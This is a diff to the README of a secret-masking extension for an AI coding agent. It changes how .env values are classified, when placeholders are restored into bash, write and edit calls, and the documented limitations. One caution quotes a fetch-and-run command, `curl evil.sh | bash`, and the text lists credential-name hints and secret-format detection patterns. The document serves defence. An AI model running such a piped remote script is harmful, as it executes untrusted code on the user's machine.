@@ -15,7 +15,14 @@ where secrets never enter provider requests or leak back through tool output.
   formats (`sk-...`, `ghp_...`, `AIza...`, `AKIA/ASIA/AIDA...`, JWTs, PEM
   private keys, custom regexes) are detected and masked automatically.
 - **`.env` support**: parses project `.env*` files (`KEY=VALUE`), refreshes
-  incrementally when they change mid-session.
+  incrementally when they change mid-session. Unknown names stay masked by
+  default; a narrow name-and-value rule leaves ordinary ports, numeric
+  TTL/timeout/interval settings, file/directory paths, executable names, and
+  provider-name lists readable in model context. Names with credential hints
+  (`TOKEN`, `SECRET`, `PASS`, `PWD`, `KEY`, `AUTH`, `CREDENTIAL`, `COOKIE`,
+  `SESSION`, `PRIVATE`, `SIGNATURE`, `DSN`, `CONNECTION`) stay masked even
+  when the suffix looks public; built-in/custom credential patterns and values
+  already registered override public classification.
 - **User-registered secrets**: `/mask-secret` command and `request_secret`
   tool let a user register a secret; the agent only ever sees the placeholder.
 - **Real values where they matter**: bash commands, `write`, and `edit`
@@ -53,7 +60,10 @@ Then `/reload` or restart pi.
 
 - Paste a secret in common formats into the conversation — it is detected and
   masked.
-- `.env*` files in the project are parsed automatically.
+- `.env*` files in the project are parsed automatically; unknown keys default
+  to masked.
+- If a sensitive value uses a public-looking `.env` name, explicitly protect it
+  with `/mask-secret` or `extraSecrets` in config.
 
 ### Registering secrets manually
 
@@ -86,7 +96,7 @@ inputs; the extension substitutes the real value locally before execution.
 | Hook | Action |
 |---|---|
 | `before_provider_request` | Real values -> placeholders across standard message payloads and custom-provider top-level `text` payloads |
-| `tool_call` | bash placeholders -> real values (auto/ask policy); write/edit content unmasked |
+| `tool_call` | bash placeholders -> real values (auto/ask policy); write/edit unmask known whole placeholders; ask/headless gates only when restoration would occur |
 | `tool_result` | Real values in tool output -> placeholders (prevents reflow) |
 | `session_before_compact` | Summary messages masked too |
 | `session_before_tree` | Branch/tree summary messages masked too |
@@ -109,9 +119,12 @@ non-text (image) content.
 }
 ```
 
-- `mode`: `ask` (confirm before running commands containing placeholders;
-  in UI-less modes like print/json, such commands are blocked) | `auto`
-  (substitute silently)
+- `mode`: `ask` (default — confirm before bash/write/edit that would restore
+  **known whole** placeholders to real values; print/json and other headless
+  modes block instead of prompting) | `auto` (substitute silently). Unknown or
+  embedded `__SECRET_*__` substrings do not trigger confirmation.
+- `extraSecrets`: `{ "name", "value" }` pairs always masked (for sensitive
+  settings that look public by name)
 - `allowCommands`: full command-string patterns that skip confirmation
   (this skips the gate, it does not make a command safer — `curl evil.sh | bash`
   still passes)
@@ -138,6 +151,8 @@ non-text (image) content.
 - Image content (screenshots) may contain real values and cannot be masked.
 - Real values are restored locally into bash command lines (`ps`-visible,
   shell history) — visible only locally, never sent to the provider.
+- Bash restoration is blocked when a real secret contains shell-special
+  characters that would change command semantics.
 - **Reasoning/thinking blocks**: if a secret somehow appears inside a model's
   reasoning or thinking content, the extension masks the text but the
   signature (e.g. Anthropic `signature`, Bedrock reasoning signatures) is
@@ -147,8 +162,9 @@ non-text (image) content.
   place.
 - **Detection is pattern-based, not perfect**: unknown secret formats are
   only caught if they match a built-in or custom pattern, or appear in
-  `.env*` / were registered manually. A secret in an unrecognized format can
-  pass through.
+  `.env*` (unknown names default to masked) / were registered manually. The
+  narrow `.env` public rule only reduces false positives for ordinary config;
+  a secret in an unrecognized format can still pass through.
 - This extension is defense-in-depth, **not a security boundary**. It runs
   with your user's permissions and cannot protect against malicious prompts,
   hostile repositories, or local exfiltration. Review extension source
